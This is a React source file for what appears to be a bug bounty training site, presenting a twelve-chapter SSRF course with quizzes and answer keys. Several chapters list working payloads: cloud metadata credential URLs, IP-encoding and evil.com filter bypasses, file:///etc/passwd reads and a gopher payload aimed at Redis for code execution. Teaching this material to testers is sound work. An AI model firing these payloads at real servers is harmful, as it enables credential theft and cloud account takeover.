import React, { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import Navbar from "../../../components/Navbar/Navbar";
import "./SSRF.css";
const STORAGE_KEY = "VulnXploit_ssrf_course_completed";

const chapters = [
  {
    id: "what-is-ssrf",
    title: "01 What is SSRF?",
    content: (
      <>
        <h2>What is SSRF (Server-Side Request Forgery)?</h2>
        <p>
          Server-Side Request Forgery (SSRF) is a vulnerability that allows an
          attacker to make the server send HTTP (or other protocol) requests to
          arbitrary destinations. The attacker controls part or all of the URL
          that the server will request.
        </p>
        <p>
          SSRF is critical because it can reach internal services, cloud
          metadata endpoints, and other systems that are not directly accessible
          from the internet.
        </p>
        <h3>How SSRF Works</h3>
        <ol>
          <li>Application accepts a URL or host from the user (webhook, image fetch, PDF generator, etc.).</li>
          <li>Server makes a request to that URL on behalf of the application.</li>
          <li>Attacker supplies an internal or sensitive destination instead of a public URL.</li>
          <li>Server fetches internal resources or cloud metadata.</li>
          <li>Attacker reads the response or triggers actions on internal systems.</li>
        </ol>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            SSRF = Forcing the server to make requests to internal or attacker-chosen
            targets, often leading to data exposure or further compromise.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the core idea of SSRF?",
      options: [
        "Forcing the client browser to make requests",
        "Forcing the server to make requests to attacker-controlled or internal destinations",
        "Only stealing cookies",
        "Only performing XSS"
      ],
      correct: "Forcing the server to make requests to attacker-controlled or internal destinations",
    },
  },
  {
    id: "impact",
    title: "02 Impact of SSRF",
    content: (
      <>
        <h2>Impact of SSRF</h2>
        <h3>What Attackers Can Achieve</h3>
        <ul>
          <li>Read cloud metadata (AWS, GCP, Azure credentials)</li>
          <li>Access internal admin panels and APIs</li>
          <li>Scan internal network and discover services</li>
          <li>Read local files (via file:// or gopher:// in some cases)</li>
          <li>Bypass IP-based access controls / firewalls</li>
          <li>Interact with Redis, Memcached, Elasticsearch, etc.</li>
          <li>Pivot to other internal applications</li>
          <li>In worst cases, achieve RCE through secondary vulnerabilities</li>
        </ul>
        <h3>Why It’s High Severity</h3>
        <p>
          Internal services often assume they are only reachable from inside the
          network and therefore have weak or no authentication. SSRF breaks that
          assumption.
        </p>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            SSRF is high impact because it turns the server into a proxy into
            the internal network and cloud metadata.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Why is SSRF considered high severity?",
      options: [
        "It only affects the frontend",
        "It can reach internal services and cloud metadata that are not meant to be public",
        "It only causes reflected XSS",
        "It is always easy to exploit with no impact"
      ],
      correct: "It can reach internal services and cloud metadata that are not meant to be public",
    },
  },
  {
    id: "types",
    title: "03 Types of SSRF",
    content: (
      <>
        <h2>Types of SSRF</h2>
        <h3>1. Basic (In-Band) SSRF</h3>
        <p>
          The response from the internal request is returned directly to the
          attacker in the application response.
        </p>
        <h3>2. Blind SSRF</h3>
        <p>
          The server makes the request but does not return the body. Detection
          relies on timing, error messages, or out-of-band (DNS/HTTP) callbacks.
        </p>
        <h3>3. Semi-Blind SSRF</h3>
        <p>
          Partial information is returned (status codes, response length, error
          messages) that helps map internal services.
        </p>
        <h3>4. SSRF to RCE / Critical Impact</h3>
        <p>
          SSRF is chained with other issues (unsafe deserialization, Redis,
          gopher, dict protocols) to achieve code execution or credential theft.
        </p>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Main types: Basic (response returned), Blind (OOB/timing), and
            chained SSRF leading to higher impact.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is Blind SSRF?",
      options: [
        "The full response body is returned to the attacker",
        "The server makes the request but the response body is not returned to the attacker",
        "Only works on localhost",
        "Only works with file:// protocol"
      ],
      correct: "The server makes the request but the response body is not returned to the attacker",
    },
  },
  {
    id: "attack-surface",
    title: "04 SSRF Attack Surface",
    content: (
      <>
        <h2>SSRF Attack Surface</h2>
        <h3>Common Features That Fetch URLs</h3>
        <ul>
          <li>Webhook / callback URL configuration</li>
          <li>Profile picture or avatar from URL</li>
          <li>PDF / document generators (HTML to PDF)</li>
          <li>Link preview / unfurl features</li>
          <li>Import from URL (RSS, data import)</li>
          <li>API integrations that call external services</li>
          <li>Proxy or “fetch this URL” tools</li>
          <li>SSO / OAuth redirect and metadata endpoints</li>
        </ul>
        <h3>Parameters to Look For</h3>
        <pre className="payload-box">
{`url
uri
path
dest
redirect
callback
webhook
target
link
src
href
host
api
feed
image
file`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Any feature that accepts a URL or host and makes a server-side
            request is a potential SSRF sink.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which of the following is a common SSRF attack surface?",
      options: [
        "Only login forms",
        "Webhook URLs, PDF generators, image fetch from URL, link previews",
        "Only static HTML pages",
        "Only client-side JavaScript"
      ],
      correct: "Webhook URLs, PDF generators, image fetch from URL, link previews",
    },
  },
  {
    id: "basic-ssrf",
    title: "05 Basic SSRF Exploitation",
    content: (
      <>
        <h2>Basic SSRF Exploitation</h2>
        <h3>Localhost & Internal IPs</h3>
        <pre className="payload-box">
{`http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.1
http://2130706433          (decimal IP for 127.0.0.1)
http://0x7f000001          (hex)
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:3306
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1`}
        </pre>
        <h3>Internal Services</h3>
        <pre className="payload-box">
{`http://localhost/admin
http://127.0.0.1:6379      (Redis)
http://127.0.0.1:9200      (Elasticsearch)
http://127.0.0.1:11211     (Memcached)
http://internal-api.local
http://metadata`}
        </pre>
        <h3>Testing Workflow</h3>
        <ol>
          <li>Confirm the parameter is used in a server-side request.</li>
          <li>Point it to a collaborator / webhook.site to prove outbound request.</li>
          <li>Try localhost and common internal IPs/ports.</li>
          <li>If response is reflected, read internal content.</li>
        </ol>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Start with collaborator proof, then move to localhost and internal
            IP ranges to discover services.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What should you do first when testing a potential SSRF parameter?",
      options: [
        "Immediately try file:///etc/passwd",
        "Prove the server makes an outbound request using a Collaborator / webhook",
        "Only test with public Google.com",
        "Ignore internal IPs"
      ],
      correct: "Prove the server makes an outbound request using a Collaborator / webhook",
    },
  },
  {
    id: "cloud-metadata",
    title: "06 Cloud Metadata SSRF",
    content: (
      <>
        <h2>Cloud Metadata Endpoints</h2>
        <p>
          Cloud instances expose metadata services that often contain IAM
          credentials, instance info, and user-data scripts.
        </p>
        <h3>AWS</h3>
        <pre className="payload-box">
{`http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 requires a token (PUT first), but many apps still allow IMDSv1`}
        </pre>
        <h3>Google Cloud (GCP)</h3>
        <pre className="payload-box">
{`http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header often required: Metadata-Flavor: Google`}
        </pre>
        <h3>Azure</h3>
        <pre className="payload-box">
{`http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true`}
        </pre>
        <h3>DigitalOcean / Others</h3>
        <pre className="payload-box">
{`http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/user-data`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Always test cloud metadata endpoints. Stolen IAM credentials can
            lead to full cloud account compromise.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the most famous cloud metadata IP used in SSRF attacks?",
      options: [
        "8.8.8.8",
        "169.254.169.254",
        "192.168.1.1",
        "10.0.0.1"
      ],
      correct: "169.254.169.254",
    },
  },
  {
    id: "bypass-filters",
    title: "07 Filter Bypass Techniques",
    content: (
      <>
        <h2>SSRF Filter Bypass Techniques</h2>
        <h3>IP Encoding Tricks</h3>
        <pre className="payload-box">
{`127.0.0.1
2130706433                 (decimal)
0x7f000001                 (hex)
0177.0.0.1                 (octal)
127.1
127.0.1
0
127.0.0.1.nip.io
localtest.me               (resolves to 127.0.0.1)`}
        </pre>
        <h3>URL Parsing Tricks</h3>
        <pre className="payload-box">
{`http://127.0.0.1#@evil.com
http://evil.com@127.0.0.1
http://127.0.0.1:80@evil.com
http://127.0.0.1%00.evil.com
http://127.0.0.1%09.evil.com
http://0x7f000001
http://[::ffff:127.0.0.1]`}
        </pre>
        <h3>DNS Rebinding / Redirects</h3>
        <ul>
          <li>Short TTL DNS that first points to allowed IP, then to internal.</li>
          <li>Open redirects on allowed domains that redirect to internal targets.</li>
          <li>URL shorteners (if allowed) that redirect internally.</li>
        </ul>
        <h3>Alternative Protocols (when supported)</h3>
        <pre className="payload-box">
{`file:///etc/passwd
gopher://127.0.0.1:6379/_...
dict://127.0.0.1:11211/
ftp://internal
ldap://internal`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Filters are often incomplete. Try encoding, URL tricks, redirects,
            DNS rebinding, and alternative schemes.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which of the following is a common SSRF filter bypass technique?",
      options: [
        "Only using https://google.com",
        "Decimal/hex IP encoding, URL parsing tricks, and alternative schemes like gopher://",
        "Only changing the User-Agent",
        "Disabling JavaScript"
      ],
      correct: "Decimal/hex IP encoding, URL parsing tricks, and alternative schemes like gopher://",
    },
  },
  {
    id: "blind-ssrf",
    title: "08 Blind SSRF",
    content: (
      <>
        <h2>Blind SSRF</h2>
        <p>
          When the application does not return the response body, you must
          detect SSRF through side channels.
        </p>
        <h3>Detection Methods</h3>
        <ul>
          <li><strong>Out-of-Band (OOB)</strong> – Burp Collaborator, interactsh, webhook.site</li>
          <li><strong>Timing</strong> – Delay differences when hitting open vs closed ports</li>
          <li><strong>Error messages</strong> – Different errors for valid vs invalid hosts</li>
          <li><strong>Response length / status</strong> – Subtle differences</li>
        </ul>
        <h3>OOB Proof</h3>
        <pre className="payload-box">
{`http://YOUR-COLLABORATOR.oastify.com
http://YOUR-ID.burpcollaborator.net
http://YOUR.webhook.site`}
        </pre>
        <h3>Port Scanning via Timing</h3>
        <pre className="payload-box">
{`http://127.0.0.1:22      → fast or specific error
http://127.0.0.1:80      → different timing
http://127.0.0.1:65535   → timeout vs reset`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Blind SSRF is still highly valuable. Prove it with OOB callbacks,
            then map internal ports with timing and errors.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "How do you primarily detect Blind SSRF?",
      options: [
        "By reading the full response body",
        "Using Out-of-Band (OOB) callbacks, timing differences, or error messages",
        "Only by looking at the page title",
        "It cannot be detected"
      ],
      correct: "Using Out-of-Band (OOB) callbacks, timing differences, or error messages",
    },
  },
  {
    id: "advanced",
    title: "09 Advanced SSRF Attacks",
    content: (
      <>
        <h2>Advanced SSRF Attacks</h2>
        <h3>Gopher Protocol (Redis, etc.)</h3>
        <pre className="payload-box">
{`gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_*%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0a...
(can lead to RCE on misconfigured Redis)`}
        </pre>
        <h3>Dict Protocol</h3>
        <pre className="payload-box">
{`dict://127.0.0.1:11211/stats`}
        </pre>
        <h3>File Protocol</h3>
        <pre className="payload-box">
{`file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ`}
        </pre>
        <h3>SSRF to XSS / Client Impact</h3>
        <p>
          Sometimes the fetched content is reflected into a page without
          encoding, turning SSRF into stored XSS.
        </p>
        <h3>Chaining with Other Bugs</h3>
        <ul>
          <li>SSRF → cloud credentials → cloud takeover</li>
          <li>SSRF → internal admin panel → further exploitation</li>
          <li>SSRF → Redis/Memcached → RCE</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Advanced SSRF uses alternative protocols and chaining to reach RCE
            or full cloud compromise.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which protocol is commonly abused in advanced SSRF to attack Redis?",
      options: [
        "Only HTTP",
        "gopher://",
        "Only FTP",
        "Only mailto:"
      ],
      correct: "gopher://",
    },
  },
  {
    id: "hunting",
    title: "10 SSRF Hunting Methodology",
    content: (
      <>
        <h2>SSRF Hunting Methodology</h2>
        <h3>Step-by-Step</h3>
        <ol>
          <li><strong>Find URL parameters</strong> – Anything that looks like a URL, host, or callback.</li>
          <li><strong>Prove outbound request</strong> – Use Collaborator / interactsh / webhook.</li>
          <li><strong>Test localhost & internal ranges</strong> – 127.0.0.1, 10.x, 172.16.x, 192.168.x.</li>
          <li><strong>Test cloud metadata</strong> – 169.254.169.254 and provider-specific paths.</li>
          <li><strong>Try filter bypasses</strong> – Encoding, redirects, DNS tricks.</li>
          <li><strong>Map internal services</strong> – Common ports and paths.</li>
          <li><strong>Assess impact</strong> – Credentials, internal data, potential RCE.</li>
          <li><strong>Document clearly</strong> – Steps, payloads, and business impact.</li>
        </ol>
        <h3>Useful Tools</h3>
        <ul>
          <li>Burp Collaborator / interactsh</li>
          <li>ffuf / custom scripts for port discovery</li>
          <li>SSRFmap, Gopherus (for gopher payloads)</li>
          <li>Manual testing with Repeater</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Prove SSRF with OOB first, then systematically target localhost,
            internal IPs, and cloud metadata.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the recommended first step in SSRF hunting methodology?",
      options: [
        "Immediately try RCE payloads",
        "Prove the outbound request with an OOB collaborator",
        "Only test production domains",
        "Ignore cloud metadata"
      ],
      correct: "Prove the outbound request with an OOB collaborator",
    },
  },
  {
    id: "payloads",
    title: "11 Useful SSRF Payloads",
    content: (
      <>
        <h2>Useful SSRF Payloads</h2>
        <h3>Basic</h3>
        <pre className="payload-box">
{`http://127.0.0.1
http://localhost
http://[::1]
http://0x7f000001
http://2130706433
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:443`}
        </pre>
        <h3>Cloud Metadata</h3>
        <pre className="payload-box">
{`http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01`}
        </pre>
        <h3>Bypass Style</h3>
        <pre className="payload-box">
{`http://127.0.0.1#@evil.com
http://evil.com@127.0.0.1
http://127.1
http://0
http://localtest.me
http://127.0.0.1.nip.io`}
        </pre>
        <h3>Alternative Schemes</h3>
        <pre className="payload-box">
{`file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stats`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Keep a ready list of localhost variants, metadata URLs, bypass
            tricks, and alternative protocols for quick testing.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which payload is commonly used to target AWS metadata?",
      options: [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://google.com",
        "file:///etc/passwd"
      ],
      correct: "http://169.254.169.254/latest/meta-data/",
    },
  },
  {
    id: "prevention",
    title: "12 SSRF Prevention",
    content: (
      <>
        <h2>How to Prevent SSRF</h2>
        <ul>
          <li><strong>Avoid user-controlled URLs</strong> when possible. Use allow-listed destinations.</li>
          <li>Implement a strict allow-list of permitted domains/IPs.</li>
          <li>Block requests to private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1, etc.).</li>
          <li>Disable unnecessary URL schemes (file://, gopher://, dict://, ftp://).</li>
          <li>Do not return raw response bodies from fetched URLs to users.</li>
          <li>Use network segmentation so the app server cannot reach sensitive internal services.</li>
          <li>For cloud: require IMDSv2 and restrict metadata access.</li>
          <li>Validate and sanitize redirect chains; limit number of redirects.</li>
          <li>Apply least privilege to the application’s network permissions.</li>
        </ul>
        <h3>Safe Pattern</h3>
        <pre className="payload-box">
{`// Pseudocode
if not is_allowed_domain(url):
    reject
if resolves_to_private_ip(url):
    reject
response = fetch(url, allowed_schemes=["http", "https"])
// Do not reflect full response; process only needed safe fields`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Best defenses: allow-list destinations, block private IPs, disable
            dangerous schemes, and segment the network.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is one of the strongest defenses against SSRF?",
      options: [
        "Trust all user-supplied URLs",
        "Use a strict allow-list of destinations and block private IP ranges",
        "Only use client-side validation",
        "Allow all schemes including gopher and file"
      ],
      correct: "Use a strict allow-list of destinations and block private IP ranges",
    },
  },
];


const SSRF = () => {
  const [activeChapter, setActiveChapter] = useState(chapters[0]);
  const [selectedOption, setSelectedOption] = useState("");
  const [showCongrats, setShowCongrats] = useState(false);
  const [completedChapters, setCompletedChapters] = useState(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  useEffect(() => {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(completedChapters));
  }, [completedChapters]);

  const completedCount = completedChapters.length;
  const totalChapters = chapters.length;
  const progress = Math.round((completedCount / totalChapters) * 100);

  const handleSubmit = () => {
    if (!activeChapter.quiz) return;
    if (selectedOption === activeChapter.quiz.correct) {
      setShowCongrats(true);
      if (!completedChapters.includes(activeChapter.id)) {
        setCompletedChapters([...completedChapters, activeChapter.id]);
      }
    } else {
      alert("❌ Wrong answer. Try again!");
    }
  };

  const closeCongrats = () => {
    setShowCongrats(false);
    setSelectedOption("");
  };

  return (
    <div className="article-page">
      <Navbar />

      <section className="article-header">
        <div className="article-header-content">
          <Link to="/bug-bounty" className="back-link">
            ← Back to Bug Bounty Courses
          </Link>
          <h1>
            The ultimate Bug Bounty guide to{" "}
            <span className="gradient-text">SSRF</span>
          </h1>
          <p className="article-date">Updated • 2026</p>
          <p className="article-date" style={{ marginTop: 8 }}>
            Progress: {completedCount}/{totalChapters} chapters · {progress}%
          </p>
        </div>
      </section>

      <section className="article-banner">
        <img
          src="https://plain-apac-prod-public.komododecks.com/202610/03/AyOdumL16sagmKDR6yDT/image.png"
          alt="SSRF Guide"
          onError={(e) => {
            e.target.src =
              "https://via.placeholder.com/1200x420/1a0b2e/a855f7?text=SSRF";
          }}
        />
      </section>

      <section className="article-body">
        <div className="article-container">
          <aside className="article-sidebar">
            <h3>On this Article</h3>
            <ul>
              {chapters.map((chapter) => (
                <li
                  key={chapter.id}
                  className={`${
                    activeChapter.id === chapter.id ? "active" : ""
                  } ${completedChapters.includes(chapter.id) ? "completed" : ""}`}
                  onClick={() => {
                    setActiveChapter(chapter);
                    setSelectedOption("");
                  }}
                >
                  {chapter.title}
                  {completedChapters.includes(chapter.id) && (
                    <span className="check-mark">✓</span>
                  )}
                </li>
              ))}
            </ul>
          </aside>

          <div className="article-content">
            {activeChapter.content}

            {activeChapter.quiz && (
              <div className="quiz-box">
                <h3>Quick Check</h3>
                <p className="quiz-question">{activeChapter.quiz.question}</p>
                <div className="quiz-options">
                  {activeChapter.quiz.options.map((opt) => (
                    <label key={opt} className="quiz-option">
                      <input
                        type="radio"
                        name="quiz"
                        value={opt}
                        checked={selectedOption === opt}
                        onChange={(e) => setSelectedOption(e.target.value)}
                      />
                      <span>{opt}</span>
                    </label>
                  ))}
                </div>
                <button className="quiz-submit" onClick={handleSubmit}>
                  Submit Answer
                </button>
              </div>
            )}
          </div>
        </div>
      </section>

      {showCongrats && (
        <div className="congrats-overlay">
          <div className="congrats-modal">
            <div className="congrats-icon">🎉</div>
            <h2>Congratulations!</h2>
            <p>You completed this step successfully.</p>
            <button onClick={closeCongrats}>Continue Learning</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default SSRF;